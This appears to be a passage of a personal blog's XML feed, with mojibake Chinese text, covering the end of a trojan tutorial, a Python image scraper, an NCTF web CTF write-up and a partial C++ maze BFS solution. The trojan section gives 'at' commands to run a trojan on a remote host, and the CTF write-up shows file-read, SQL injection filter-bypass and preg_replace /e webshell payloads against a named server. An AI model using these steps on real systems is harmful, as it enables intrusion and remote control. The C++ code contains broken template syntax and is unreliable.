<h3 id="5-è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬"><a href="#5-è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬" class="headerlink" title="5.è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬"></a>5.è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬</h3><p><code>net time \\10.1.1.1</code>æ ¹æ®ç›®æ ‡ä¸»æœºæ—¶é—´è®¾ç½®äº‹ç‰©çš„å¼€å§‹æ—¶é—´<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>åœ¨ä¸Šé¢çš„æ—¶é—´ä¹‹åä¸‰åˆ†é’Ÿå·¦å³è®¾ç½®ä¸€ä¸ªäº‹ç‰©<br>å³åœ¨17ï¼š17æ—¶è¿è¡Œæœ¨é©¬æ–‡ä»¶</p>
<h3 id="6-æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº"><a href="#6-æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº" class="headerlink" title="6.æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº"></a>6.æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº</h3><p>è§‚å¯Ÿç›®æ ‡ä¸»æœºå·²è‡ªåŠ¨ä¸Šçº¿ï¼Œå·²å¯ä»¥è¿›è¡Œç›‘æ§æˆ–ä¼ è¾“æ•°æ®ç­‰æ“ä½œ</p>
<p>è·å–å±å¹•å†…å®¹<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/5.png" srcset="/img/loading.gif" alt></p>
<p>æ§åˆ¶å‘½ä»¤è¡Œ<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/6.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>æœ¨é©¬</category>
      </categories>
  </entry>
  <entry>
    <title>çˆ¬å›¾</title>
    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡"><a href="#ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡" class="headerlink" title="ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡"></a>ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡</h1><a id="more"></a>
<p><strong>ç”¨çš„åº“</strong></p>
<div class="hljs"><pre><code class="hljs applescript">re <span class="hljs-comment">#æ­£åˆ™è¡¨è¾¾å¼</span>
requests <span class="hljs-comment">#urlè¯·æ±‚</span>
<span class="hljs-built_in">time</span>   <span class="hljs-comment">#æ—¶é—´</span>
os     <span class="hljs-comment">#ç”¨äºåˆ›å»ºæ–‡ä»¶å¤¹ï¼Œä¿å­˜å›¾ç‰‡</span></code></pre></div>
<p>##å‡†å¤‡å·¥ä½œ<br>1.é¦–å…ˆè®¿é—®è¯¥é“¾æ¥<br><code>https://www.vmgirls.com/</code><br>2.éšä¾¿ç‚¹å‡»ä¸€ä¸ªè¿›å…¥æŸ¥çœ‹è¯¦æƒ…<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12å®¡æŸ¥å…ƒç´ ç½‘æŸ¥çœ‹é¡µè¯¦æƒ…ï¼Œä¸»è¦æŸ¥çœ‹å›¾ç‰‡é“¾æ¥çš„æ ‡ç­¾ä½ç½®ï¼Œå†™å‡ºæ­£åˆ™è¡¨è¾¾å¼<br><img src="/2020/07/18/%E7%88%AC%E5%9B%BE/picturelink.png" srcset="/img/loading.gif" alt="1"><br>è¯¥æ­£åˆ™è¡¨è¾¾å¼ä¸º<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p>
<h2 id="å®Œæ•´ç¨‹åº"><a href="#å®Œæ•´ç¨‹åº" class="headerlink" title="å®Œæ•´ç¨‹åº"></a>å®Œæ•´ç¨‹åº</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/7/16 13:36</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : tupian.py</span>
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> os

dir = <span class="hljs-string">"plmm"</span>        <span class="hljs-comment">#æ–‡ä»¶å¤¹åå­—</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):   <span class="hljs-comment">#é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨å½“å‰æ–‡ä»¶å¤¹å¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºä¸€ä¸ª</span>
    os.mkdir(dir)
<span class="hljs-comment"># æ¨¡ä»¿æµè§ˆå™¨çš„é¦–éƒ¨ä¿¡æ¯ï¼Œç»•è¿‡ä¸€äº›ç½‘ç«™çš„åçˆ¬å–æªæ–½</span>
head = &#123;
        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>
    &#125;

url = <span class="hljs-string">"https://www.vmgirls.com/13344.html"</span>
response = requests.get(url, headers = head)   <span class="hljs-comment"># è®¿é—®ç›®æ ‡ç½‘é¡µï¼Œè·å–ç½‘é¡µå†…å®¹</span>
html = response.text

findlinks = <span class="hljs-string">'&lt;a href="(.*?)" alt=".*?" title=".*?"&gt;'</span>
urls = re.findall(findlinks, html)   <span class="hljs-comment">#çˆ¬å–åˆ°çš„å›¾ç‰‡é“¾æ¥ä¿å­˜åœ¨urlsä¸­ï¼Œ æ˜¯ä¸€ä¸ªåˆ—è¡¨</span>

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment">#é˜²æ­¢è®¿é—®é€Ÿåº¦è¿‡å¿«ä½¿æœåŠ¡å™¨å´©æºƒ</span>
    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]    <span class="hljs-comment">#ä¿å­˜å›¾ç‰‡çš„åå­—</span>

    res = requests.get(url, headers = head)   <span class="hljs-comment">#ä¾æ­¤è®¿é—®å›¾ç‰‡é“¾æ¥</span>
    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:   <span class="hljs-comment">#ä»¥äºŒè¿›åˆ¶å½¢å¼ä¿å­˜å›¾ç‰‡</span>
        f.write(res.content)</code></pre></div>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>çˆ¬è™«</tag>
      </tags>
  </entry>
  <entry>
    <title>ç»¼åˆ2</title>
    <url>/2020/09/03/%E7%BB%BC%E5%90%882/</url>
    <content><![CDATA[<h1 id="NCTF-ç»¼åˆ2"><a href="#NCTF-ç»¼åˆ2" class="headerlink" title="NCTF-ç»¼åˆ2"></a>NCTF-ç»¼åˆ2</h1><a id="more"></a>

<p>è¿›å…¥é¡µé¢ï¼Œæ²¡ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œéšä¾¿ç‚¹ç‚¹</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/1.png" srcset="/img/loading.gif" alt></p>
<p>ç•™è¨€å¯ä»¥æ­£å¸¸æäº¤ï¼Œæœ¬ä»¥ä¸ºæœ‰xss,ä½†æ˜¯å·²ç»æç¤ºä¸æ˜¯xss</p>
<p>çœ‹åˆ°æœ€ä¸‹é¢æœ‰ä¸ªç½‘ç«™è¯´æ˜   <a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="noopener">æœ¬CMSè¯´æ˜</a>  ï¼Œæœ‰ç”¨çš„å†…å®¹å¦‚ä¸‹</p>
<blockquote>
<p>config.phpï¼šå­˜æ”¾æ•°æ®åº“ä¿¡æ¯ï¼Œç§»æ¤æ­¤CMSæ—¶è¦ä¿®æ”¹ </p>
<p>index.phpï¼šä¸»é¡µæ–‡ä»¶ </p>
<p>passencode.phpï¼šFunnyå…¬å¸è‡ªå†™å¯†ç åŠ å¯†ç®—æ³•åº“ </p>
<p>say.phpï¼šç”¨äºæ¥æ”¶å’Œå¤„ç†ç”¨æˆ·ç•™è¨€è¯·æ±‚ </p>
<p>sm.txtï¼šæœ¬CMSçš„è¯´æ˜æ–‡æ¡£ saeçš„information_schemaè¡¨å¥½åƒæ²¡æ³•æ£€ç´¢</p>
<p>adminè¡¨ç»“æ„ create table admin ( id integer, username text, userpass text, )  </p>
</blockquote>
<p> <code>http://cms.nuptzj.cn/about.php?file=sm.txt</code>å¯ä»¥ä½¿ç”¨phpä¼ªåè®®ä»»æ„è¯»å–æ–‡ä»¶å†…å®¹ã€‚ åŒ…æ‹¬è‡ªå·±</p>
<p>å°è¯•è¯»å–index.phpçš„æºç ï¼Œå‘ç°å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</p>
<p>è¯»å–<code>about.php</code></p>
<div class="hljs"><pre><code class="hljs php+HTML">
&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;

&lt;?php
$file&#x3D;$_GET[&#39;file&#39;];
if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;   &#x2F;&#x2F; æœ‰config.php
	echo &quot;fileå‚æ•°ä¸èƒ½ä¸ºç©ºï¼&quot;;
	exit();
&#125;else&#123;
	$cut&#x3D;strchr($file,&quot;loginxlcteam&quot;);   &#x2F;&#x2F;åŒ…å«äº† loginxlcteamé¡µé¢
	if($cut&#x3D;&#x3D;false)&#123;
	$data&#x3D;file_get_contents($file);
	$date&#x3D;htmlspecialchars($data);
	echo $date;
	&#125;else&#123;
		echo &quot;&lt;script&gt;alert(&#39;æ•æ„Ÿç›®å½•ï¼Œç¦æ­¢æŸ¥çœ‹ï¼ä½†æ˜¯ã€‚ã€‚ã€‚&#39;)&lt;&#x2F;script&gt;&quot;;
	&#125;
&#125;</code></pre></div>

<p>è¯»å–config.phpï¼Œæ— æœ‰ç”¨ä¿¡æ¯</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/2.png" srcset="/img/loading.gif" alt></p>
<p>æŸ¥çœ‹<code>loginxlcteam</code>,æ˜¯ä¸ªç™»å½•é¡µé¢</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/3.png" srcset="/img/loading.gif" alt></p>
<p>åˆ°æ­¤è¿˜æ˜¯æ— ä»ä¸‹æ‰‹ï¼Œå‚è€ƒå¤§ä½¬çš„åšå®¢ <a href="https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase</a> </p>
<p>åœ¨æœç´¢é¡µé¢ä¸­ä¹Ÿå­˜åœ¨æœ‰ç”¨ä¿¡æ¯</p>
<p> <code>http://cms.nuptzj.cn/about.php?file=so.php</code>è·å–æºç </p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//so.php</span>
<span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>]!=<span class="hljs-string">"Xlcteam Browser"</span>)&#123; 
    <span class="hljs-comment">//å¿…é¡»ä¿®æ”¹httpå¤´ï¼Œå§user-agentæ”¹æˆXlcteam Browser</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'ä¸‡æ¶æ»´é»‘é˜”ï¼Œæœ¬åŠŸèƒ½åªæœ‰ç”¨æœ¬å…¬å¸å¼€å‘çš„æµè§ˆå™¨æ‰å¯ä»¥ç”¨å–”~'</span>;
    <span class="hljs-keyword">exit</span>();
&#125;
$id=$_POST[<span class="hljs-string">'soid'</span>];				<span class="hljs-comment">//post ä¸€ä¸ªsoid</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">'config.php'</span>;
<span class="hljs-keyword">include</span> <span class="hljs-string">'antiinject.php'</span>;   <span class="hljs-comment">//é˜²æ³¨å…¥çš„æ–‡ä»¶</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">'antixss.php'</span>;      <span class="hljs-comment">//é˜²xssçš„æ–‡ä»¶		</span>
$id=antiinject($id);		<span class="hljs-comment">//å¯¹idè¿‡æ»¤</span>
$con = mysql_connect($db_address,$db_user,$db_pass) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"ä¸èƒ½è¿æ¥åˆ°æ•°æ®åº“ï¼ï¼"</span>.mysql_error());
mysql_select_db($db_name,$con);
$id=mysql_real_escape_string($id);
$result=mysql_query(<span class="hljs-string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);  <span class="hljs-comment">//sqlæŸ¥è¯¢ï¼Œå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹</span>
$rs=mysql_fetch_array($result);
<span class="hljs-keyword">echo</span> htmlspecialchars($rs[<span class="hljs-string">'nice'</span>]).<span class="hljs-string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="hljs-string">'say'</span>]).<span class="hljs-string">'&lt;br /&gt;'</span>;
mysql_free_result($result);
mysql_free_result($file);
mysql_close($con);
<span class="hljs-meta">?&gt;</span></code></pre></div>





<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-comment">//antiinject.phpæºç </span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">antiinject</span><span class="hljs-params">($content)</span></span>
<span class="hljs-function"> </span>&#123; 
 	$keyword=<span class="hljs-keyword">array</span>(<span class="hljs-string">"select"</span>,<span class="hljs-string">"union"</span>,<span class="hljs-string">"and"</span>,<span class="hljs-string">"from"</span>,<span class="hljs-string">' '</span>,<span class="hljs-string">"'"</span>,<span class="hljs-string">";"</span>,<span class="hljs-string">'"'</span>,<span class="hljs-string">"char"</span>,<span class="hljs-string">"or"</span>,<span class="hljs-string">"count"</span>,<span class="hljs-string">"master"</span>,<span class="hljs-string">"name"</span>,<span class="hljs-string">"pass"</span>,<span class="hljs-string">"admin"</span>,<span class="hljs-string">"+"</span>,<span class="hljs-string">"-"</span>,<span class="hljs-string">"order"</span>,<span class="hljs-string">"="</span>); <span class="hljs-comment">//å¯¹ä¸€äº›sqlæ³¨å…¥æ—¶ç”¨åˆ°çš„å…³é”®è¯è¿›è¡Œäº†è¿‡æ»¤</span>
     $info=strtolower($content); 
 	<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;=count($keyword);$i++)
 	&#123; 
 		$info=str_replace($keyword[$i], <span class="hljs-string">''</span>,$info); 
 	&#125; 
 <span class="hljs-keyword">return</span> $info; 
 &#125; 
 <span class="hljs-meta">?&gt;</span></code></pre></div>

<p>å¤§è‡´æ„æ€å°±æ˜¯</p>
<p>1.åˆ¤æ–­httpè¯·æ±‚å¤´ä¸­çš„user-agentå‚æ•°æ˜¯å¦ä¸ºXlcteam Browser</p>
<p>2.postå‚æ•°soid</p>
<p>3.å¯¹soidè¿›è¡Œè¿‡æ»¤åå¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢</p>
<p>äºæ˜¯æŠ“åŒ…ä¿®æ”¹user-agent</p>
<p>ç¡®å®šå­˜åœ¨æ³¨å…¥ç‚¹</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/4.png" srcset="/img/loading.gif" alt></p>
<p>ç”±äºä¹‹å‰æç¤ºäº†<strong>adminè¡¨ç»“æ„ create table admin ( id integer, username text, userpass text, )</strong>  </p>
<p>å¯ç›´æ¥å†™å‡ºæŸ¥è¯¢è¯­å¥</p>
<div class="hljs"><pre><code class="hljs reasonml">(sselectelect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">userppassass</span>)</span><span class="hljs-comment">/**/</span>ffromrom<span class="hljs-comment">/**/</span>aadmindmin)</code></pre></div>

<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/5.png" srcset="/img/loading.gif" alt></p>
<p>ASCIIç è½¬å­—ç¬¦ä¸²ç»“æœä¸ºï¼š fuckruntu </p>
<p>ç™»å½•</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/6.png" srcset="/img/loading.gif" alt></p>
<p> <strong><a href="http://cms.nuptzj.cn/about.php?file=xlcteam.php" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=xlcteam.php</a></strong>  æŸ¥çœ‹æºç </p>
<div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
$e = $_REQUEST[<span class="hljs-string">'www'</span>]; 
$arr = <span class="hljs-keyword">array</span>($_POST[<span class="hljs-string">'wtf'</span>] =&gt; <span class="hljs-string">'|.*|e'</span>,); 
array_walk($arr, $e, <span class="hljs-string">''</span>); 
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>çœ‹æ ·å­æ˜¯å¯ä»¥ç”¨èœåˆ€è¿æ¥çš„</p>
<p> é‚£æ€ä¹ˆåˆ©ç”¨å°é©¬å‘¢ï¼Œæ•°ç»„çš„valueä¸­æ˜¯|.*|eï¼Œè¿™é‡Œç”¨åˆ°äº†æ­£åˆ™åŒ¹é…çš„preg_replace()çš„ä¸€ä¸ªæ¼æ´ï¼š<br>å‚è€ƒ<a href="https://www.jb51.net/article/38714.htm" target="_blank" rel="noopener">https://www.jb51.net/article/38714.htm</a><br>ç®€å•æ¥è¯´å°±æ˜¯æ­£åˆ™ä¸­/e(è¿™é‡Œå’Œ|eæ•ˆæœä¸€æ ·) ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼ˆåœ¨é€‚å½“çš„é€†å‘å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚æç¤ºï¼šè¦ç¡®ä¿ replacement æ„æˆä¸€ä¸ªåˆæ³•çš„ PHP ä»£ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ PHP ä¼šåœ¨æŠ¥å‘Šåœ¨åŒ…å« preg_replace() çš„è¡Œä¸­å‡ºç°è¯­æ³•è§£æé”™è¯¯ã€‚<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ é€’preg_replaceç»™wwwï¼Œè¿™æ ·arrayä¸­çš„å€¼å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œé”®å°±æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ­£å¥½å¯ä»¥åˆ©ç”¨preg_replaceçš„æ¼æ´ï¼Œç„¶åä¼šæ‰§è¡Œ$_POST[â€˜wtfâ€™]ï¼Œå°±ç›¸å½“äºä¸€ä¸ªä¸€å¥è¯é©¬äº†ã€‚<br>ç”¨èœåˆ€è¿æ¥ï¼š </p>
<p>url:<a href="http://cms.nuptzj.cn/xlcteam.php?www=preg_replace" target="_blank" rel="noopener">http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</a></p>
<p>å¯†ç ï¼šwtf</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/7.png" srcset="/img/loading.gif" alt></p>
<p><strong>æ€»ç»“ï¼šç®—æ˜¯ä¸€é“æ¯”è¾ƒéš¾çš„é¢˜ç›®äº†ï¼Œæ¶‰åŠåˆ°çŸ¥è¯†ç‚¹ä¹Ÿå¾ˆå¤šï¼Œè¿˜éœ€è¦å¤šçœ‹çœ‹ï¼ï¼ï¼</strong></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>shell</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>è¿·å®«é—®é¢˜</title>
    <url>/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="è¿·å®«é—®é¢˜"><a href="#è¿·å®«é—®é¢˜" class="headerlink" title="è¿·å®«é—®é¢˜"></a>è¿·å®«é—®é¢˜</h1><a id="more"></a>

<h2 id="åŸé¢˜"><a href="#åŸé¢˜" class="headerlink" title="åŸé¢˜"></a>åŸé¢˜</h2><p>é¢˜ç›®æè¿°</p>
<p>å°æ˜ç½®èº«äºä¸€ä¸ªè¿·å®«ï¼Œè¯·ä½ å¸®å°æ˜æ‰¾å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ã€‚<br> å°æ˜åªèƒ½å‘ä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘ç§»åŠ¨ã€‚</p>
<p>è¾“å…¥</p>
<p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°Tï¼Œè¡¨ç¤ºæœ‰Tç»„æµ‹è¯•æ•°æ®ã€‚<br> æ¯ç»„è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°Nå’ŒMï¼ˆ1&lt;=N,M&lt;=100ï¼‰ã€‚<br> æ¥ä¸‹æ¥Nè¡Œï¼Œæ¯è¡Œè¾“å…¥Mä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦è¡¨ç¤ºè¿·å®«ä¸­çš„ä¸€ä¸ªå°æ–¹æ ¼ã€‚<br> å­—ç¬¦çš„å«ä¹‰å¦‚ä¸‹ï¼š<br>â€˜Sâ€™ï¼šèµ·ç‚¹<br>â€˜Eâ€™ï¼šç»ˆç‚¹<br>â€˜-â€™ï¼šç©ºåœ°ï¼Œå¯ä»¥é€šè¿‡<br>â€˜#â€™ï¼šéšœç¢ï¼Œæ— æ³•é€šè¿‡<br> è¾“å…¥æ•°æ®ä¿è¯æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªèµ·ç‚¹å’Œç»ˆç‚¹ã€‚</p>
<p>è¾“å‡º</p>
<p>å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ï¼Œå¦‚æœä¸å­˜åœ¨ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„è·¯ï¼Œåˆ™è¾“å‡º-1ã€‚</p>
<h3 id="æ ·ä¾‹è¾“å…¥"><a href="#æ ·ä¾‹è¾“å…¥" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><div class="hljs"><pre><code>1
5 5
s-###
-----
##---
E#---
---##</code></pre></div><h3 id="æ ·ä¾‹è¾“å‡º"><a href="#æ ·ä¾‹è¾“å‡º" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><div class="hljs"><pre><code>9</code></pre></div><h2 id="è§£å†³ä»£ç "><a href="#è§£å†³ä»£ç " class="headerlink" title="è§£å†³ä»£ç "></a>è§£å†³ä»£ç </h2><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//è®¡æ­¥æ•°ç»„  è®°å½•èµ°åˆ°è¿™ä¸ªä½ç½®æ‰€éœ€çš„æ­¥æ•° ä¸èƒ½èµ°åˆ°çš„ä½ç½®æ ‡è®°ä¸º-1 </span>
<span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//ç”¨äºå­˜æ”¾è¿·å®«åœ°å›¾ </span>
<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,intP;  <span class="hljs-comment">//åæ ‡</span>
<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;  <span class="hljs-comment">//åœ¨å½“å‰åæ ‡ä¸‹èƒ½èµ°çš„å››ä¸ªæ–¹å‘</span>
<span class="hljs-keyword">int</span> sx,ex,sy,ey;  <span class="hljs-comment">//(sx,sy)ä¸ºèµ·ç‚¹åæ ‡  ï¼ˆex,eyï¼‰ä¸ºç»ˆç‚¹åæ ‡</span>
<span class="hljs-keyword">int</span> x,y,nx,ny; <span class="hljs-comment">//(x,y)ä¸ºå‡½æ•°ä¸­å½“å‰ä½ç½®åæ ‡   ï¼ˆnx,ny)ä¸ºæ¥ä¸‹æ¥èƒ½åˆ°è¾¾çš„åæ ‡ </span>
<span class="hljs-keyword">int</span> r,l;  <span class="hljs-comment">//rä¸ºè¡Œæ•° lä¸ºåˆ—æ•° </span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(de,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(de));
	<span class="hljs-built_in">queue</span>&lt;Pqu;
	qu.push(P(sx,sy));   //å°†èµ·ç‚¹åæ ‡æ”¾å…¥é˜Ÿå¤´ 
	de[sx][sy]=0;
	<span class="hljs-keyword">while</span>(!qu.empty()) 
	&#123;
		P p=qu.front();   //å–å‡ºé˜Ÿå¤´åæ ‡ 
		qu.pop() ;//åˆ é™¤å¯¹å¤´åŠèµ°è¿‡çš„åæ ‡ 
		x=p.first,y=p.second; 
		<span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; //åˆ°è¾¾ç»ˆç‚¹ è·³å‡ºå¾ªç¯		
	 	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=0;i&lt;4;i++)
		&#123;
			nx=x+to[0][i];//å¼€å§‹å‘å››ä¸ªæ–¹å‘ç§»åŠ¨ 
			ny=y+to[1][i];			
				<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">'#'</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>)
	 <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦è¶Šç•Œ ä»¥åŠæ˜¯å¦èƒ½èµ°  æ’é™¤èµ°è¿‡çš„è·¯ </span>
	 &#123;
	 	 qu.push(P(nx,ny));  <span class="hljs-comment">//å°†èƒ½èµ°çš„åæ ‡æ”¾å…¥é˜Ÿåˆ— ä¹‹åä¾æ¬¡åˆ é™¤ </span>
						 de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//æ­¥æ•°åŠ ä¸€ </span>
					  &#125; 				  
			&#125;
	&#125;
	<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//ç»ˆç‚¹çš„è®°æ­¥æ•°ç»„ä¸º-1 åŠä¸èƒ½åˆ°è¾¾ç»ˆç‚¹ </span>
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> n,i,j;
	<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;
		<span class="hljs-keyword">while</span>(n--)&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;
			<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;
				<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; 
				<span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];
